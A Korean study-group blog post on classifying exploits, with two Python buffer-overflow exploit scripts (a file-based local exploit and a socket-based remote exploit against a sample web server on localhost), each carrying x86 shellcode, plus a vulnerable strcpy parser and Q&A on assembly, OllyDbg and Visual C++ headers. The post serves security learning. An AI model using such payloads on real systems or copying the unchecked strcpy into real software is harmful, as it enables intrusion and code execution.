---
layout: post
title: SUA 시스템 해킹 스터디 - Exploit 분류
---

### 170811 3주차

이번 시간에는 Exploit 분류에 대해 알아보겠다.

<br>
## Exploit 분류

Exploit은 취약점을 공격하는 코드다. 크게 원격에서 공격 가능한 Remote Exploit과 로컬 상에서 공격이 가능한 Local Exploit으로 분류할 수 있다.

<br>
### 1. Local Exploit

Local Exploit은 PC 혹은 서버 내부에서 실행하는 Exploit이다. 일반적으로 권한 상승 혹은 코드 실행을 위해서 사용한다. 인자값을 직접 입력해 주어야 하는 경우나 특정 파일을 통해 입력값을 전달하게 되므로 로컬 상의 권한을 이미 가지고 있는 경우이거나, 파일 실행 등의 조건이 필요하다.

예를 들어, 파일을 입력 받아 출력해 주는 간단한 프로그램이 있다고 하자. 이 프로그램의 경우, 문자열의 길이를 검사하지 않고 복사해주기 때문에 스택 버퍼오버플로우가 발생한다. 그렇다면, 이 취약점을 공격하는 코드는 아래와 같다.

```python
import struct

print "[+] Creat text file..."

nop = "\x90" * 100

shellcode  = "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
shellcode += "\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
shellcode += "\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
shellcode += "\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
shellcode += "\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
shellcode += "\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x69\x21"
shellcode += "\x21\x01\x68\x6e\x6d\x69\x6e\x68\x20\x68\x79\x75\x89\xe1\xfe"
shellcode += "\x49\x0b\x31\xc0\x51\x50\xff\xd7"

print "Shellcode Length :", len(shellcode)
dummy = "A"*(504-len(nop+shellcode))
buf = struct.pack('<L',0x12fd50)
contents = nop + shellcode + dummy + buf

f = open("test.txt","w")
f.write(contents)
f.close()
```

위 공격 코드를 실행하면 프로그램의 입력값인 텍스트 파일을 만들어주며, 이 프로그램에는 공격 성공 후 실행할 쉘코드가 입력되어 있다(*쉘코드란, 공격자가 실행하길 원하는 코드다. 일반적으로 다양한 악성 행위를 수행하도록 만들어짐*). 공격 코드를 실행하고 생성된 악성 파일을 인자값으로 프로그램을 실행하면 공격자가 원하는 코드가 실행되는 것을 확인할 수 있다. 윈도우 OS의 경우, 주로 직접 인자값에 입력하는 방식의 공격보다는 악성 파일을 이용한 공격이 주를 이룬다. **사용자에게 입력값을 받는 모든 프로그램은 취약점이 존재할 수 있다!**

<br>
### 2. Remote Exploit

Remote Exploit은 Local Exploit과 반대로 원격에서 이루어지는 공격이다. 원격에서 패킷을 보내 공격하므로 특정 포트를 열고 서비스를 제공하는 서버 프로그램이 타겟이 된다. 단순히 포트가 열려있으면 원격에서 공격을 당할 수 있기 때문에 Remote Exploit 공격은 대부분 치명적이다.

예를 들어, 간단한 웹 서버 프로그램이 있다고 하자. 이 프로그램에는 아래 코드와 같이 요청 패킷을 파싱하는 과정에서 경계값 검사를 하지 않는 **strcpy** 함수를 사용하여 버퍼오버플로우 취약점이 발생한다.

```c
int parse(SOCKET sock, char *buf) {
  char url[1000] = {0,};
  char send_buf[2000] = {0,};
  char * token = strtok(buf, " ");
  char * method = token;
  strcpy(url, token+(strlen(method)+1));
  printf("URL : %s\n", url);
}
```

아래 Exploit 코드는 원격에서 패킷을 보내는 Remote Exploit 코드다.

```python
import struct
from socket import *

nop = "\x90" * 200
shellcode  = "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
shellcode += "\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
shellcode += "\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
shellcode += "\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
shellcode += "\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
shellcode += "\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x69\x21"
shellcode += "\x21\x01\x68\x6e\x6d\x69\x6e\x68\x20\x68\x79\x75\x89\xe1\xfe"
shellcode += "\x49\x0b\x31\xc0\x51\x50\xff\xd7";

print "Shellcode Length :", len(shellcode)
dummy = "A"*(499-len(nop+shellcode))
#buf = struct.pack('<L',0x42424242)
buf = struct.pack('<L',0x00416124)
payload = nop + shellcode + dummy + buf

print " [+] Sending Packet..."
s = socket(AF_INET,SOCK_STREAM,0)
s.connect(('127.0.0.1',80))
s.send("GET /"+payload)
print s.recv(150)
s.close()
```

위 코드를 실행하면 원격에서 해당 웹 서버 프로그램을 공격하여 원하는 코드를 실행시킬 수 있음을 확인할 수 있다.

Remote Exploit은 원격에서 직접 공격이 가능하여 주로 서버에 접근 권한을 얻기 위한 1차 공격으로 많이 사용된다. Remote Exploit을 통해 서버의 일반 사용자 권한을 획득한 뒤, Local Exploit을 통해 추가 권한 상승을 시도하는 것이 일반적인 침투 절차이다.

<br>
## [질문 내용 정리]

- **CALL(Call a Procedure), RET 와 함수 에필로그 차이점?**

어셈블리어 중 CALL 명령어는 함수 호출 시 사용한다. JMP 명령어와 비슷하게 프로그램 실행 흐름을 변경하지만 다른 점은 되돌아오는 리턴 주소(*CALL 다음 명령*)를 스택에 저장한다. 함수 호출후 원래 위치로 실행 흐름을 되돌리고 나서 다시 프로그램이 실행될 수 있다. RET 명령어는 CALL 명령어로 호출한 함수의 주소를 EIP에 저장하고, CALL 명령어로 감소되었던(*ex: PUSH 명령어로 줄어든 ESP 4바이트*) 4바이트를 다시 4바이트 증가시킨다. 함수 에필로그는 CALL 명령어로 호출한 함수를 실행하고 나서, LEAVE(*POP EBP 해서 Base Pointer를 복구하는 과정*) 와 RET 명령어(*PUSH 명령어로 줄어든 4바이트를 다시 4바이트 확장시키는 과정*) 수행을 마치고 처음 호출한 지점으로 돌아가기 위해 스택을 복원하는 과정이다. 참고로, 방식은 함수 호출 규약에 따라 조금씩 다르다.

- **Back To User Mode?**

Back To User Mode는 OllyDbg로 특정 프로그램을 디버깅할 때, 한 이벤트가 발생하기 전에 이 모드를 설정한 뒤, Call 명령어가 수행되고 나서 바로 다음 위치를 잡을 수 있는 기능을 말한다.

> 1. 분석할 프로그램을 OllyDbg로 실행한다.
> 2. F9를 눌러 프로그램 실행시켜 특정 이벤트를 발생시킨다.
> 3. F12를 눌러 프로그램을 일시정지 상태로 둔다.
> 4. Alt+F9를 누르면 Back To User Mode가 설정된다.
> 5. 프로그램을 확인해보면 잠시 멈쳤다가 정상적으로 뜬다. 이 때 버튼 클릭이나 다른 이벤트를 수행한다.
> 6. OllyDbg가 자동으로 해당 이벤트 수행 부분에 커서가 이동된다.

- **인라인 코드 패치(Inline Code Patch)**

[실습 문제](http://blog.eairship.kr/303) 중간에 EBX가 4010F5, EDX에 0으로 값을 덮어씌우고 4010F5~401248에서 순차적으로 4바이트 단위로 값을 읽어온 뒤 ADD 연산을 왜 하는 지..? 그리고 그 다음에 OEP 코드가 나오고, API 함수 호출하는 부분에서 매개변수로 받을 때, MSDN 에서 매개변수가 몇 개인지, 각각 어떤 변수인지 확인했고.. 함수 호출 시 cdecl 규약(*C/C++ 언어의 기본 함수 호출 규약*)에 따라 역순으로 매개변수를 PUSH 하고 함수 호출한 뒤 이어지는 다음 라인에 스택을 정리한다. 40122C 주소의 4010F5 값이 DlgProc 즉, IpDialogFunc의 값이 된다.(*IpDialogFunc 는 다이얼로그 박스 프로시저를 가리키는 포인터 -> 주소*) 아직 더 공부해야 함..

- **main(), tmain(), wmain() 차이?**

main() 이라는 함수는 모든 C/C++ 프로그램의 실행이 시작되는 지점. 유니코드 프로그래밍 모델을 따르는 코드를 작성할 경우 main()의 와이드(Wide) 문자 버전인 wmain()을 사용할 수 있다. tmain()은 Visual Studio에서 Win32 콘솔 응용 프로그램 프로젝트를 생성하면 생기는 함수며 TCHAR.h에 정의되어 있다.
> #define tmain wmain

즉, tmain()은 wmain()과 같은 것이다. 그리고 tmain()은 사용했을 때 유니코드가 정의되어 있지 않으면 main()으로 인식하고, 유니코드가 정의된 경우에는 wmain()으로 인식한다.

- **C/C++ 에서 stdafx.h와 Precompiled Header란?**
stdafx.h는 Standard Application Frameworks의 약자로, 개발자들의 생산성 향상을 위해 마이크로소프트에서 제공하는 소프트웨어 라이브러리 체계를 뜻하며 MFC로 구성되어 있다. (*MFC는 윈도우 환경에서 GUI 프로그램을 C++ 언어를 사용하여 개발할 때, Win32 API의 핸들과 C언어 함수들을 C++ 언어 클래스로 만든 라이브러리 ex) Visual C++*) 이 안에 포함하는 내용을 보면 윈도우 객체 생성에 필요한 기본 클래스(*afx.h, afxwin.h 등*), 윈도우 컨트롤, 기본 DB 관련 클래스, 네트워크 관련 클래스 등 기본적인 프레임워크 구축에 필요한 필수 헤더들이 있다. 그런데 일부 헤더 파일의 경우, 방대한 크기의 소스 코드를 포함할 수 있어서(*ex) window.h*) 이런 코드들을 매번 컴파일하면 전체 컴파일 시간이 길어진다. 그래서 자주 바뀌지 않는 기본적인 라이브러리들의 경우, 컴파일 시간을 줄이고자 컴파일러가 사전에 헤더 파일들을 미리 컴파일하고 쓸 수 있게 하는 데 그것이 Precompiled Header(*PCH*) 이다. MFC에서 자주 사용하는 공용 소스들을 Precompiled Header로 만들어 제공하기 위해 default로 stdafx.h와 stdafx.cpp가 자동으로 생성되는 것이다(*Visual Studio에서 프로젝트 속성 - C/C++ - 미리 컴파일된 헤더 항목에서 PCH 사용 여부 선택 가능*). 즉, PCH를 사용하면 자주 변경되지 않는 긴 소스 파일을 미리 컴파일하여 해당 컴파일 결과를 별도의 파일(.pch)에 저장을 해놓고, 컴파일할 때 해당 파일들을 새로  컴파일 하지 않고, 미리 컴파일된 파일을 사용함으로써 컴파일 속도를 향상시킨다.
